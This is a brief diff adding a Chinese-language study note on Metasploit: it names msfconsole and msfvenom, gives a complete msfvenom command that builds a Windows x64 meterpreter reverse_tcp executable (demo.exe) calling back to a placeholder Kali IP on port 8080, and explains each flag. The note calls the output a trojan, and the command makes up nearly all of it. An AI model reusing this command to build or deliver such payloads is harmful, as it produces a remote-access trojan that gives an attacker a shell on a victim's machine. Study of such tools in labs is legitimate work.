@@ -1,0 +1,8 @@
+msfconsole//启动metasploit framwork工具
+msfvenom//生成木马指令
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=Kaliip地址 lport=8080(端口设置,随意设) -f exe -o demo.exe
+-p:payload
+windows/x64/meterpreter/reverse_tcp:系统/架构/作用/方法
+lhost=Kaliip地址 lport=8080:payload设置
+-f exe:format(创建运行格式)
+-o demo.exe:为文件命名,随便命名都可
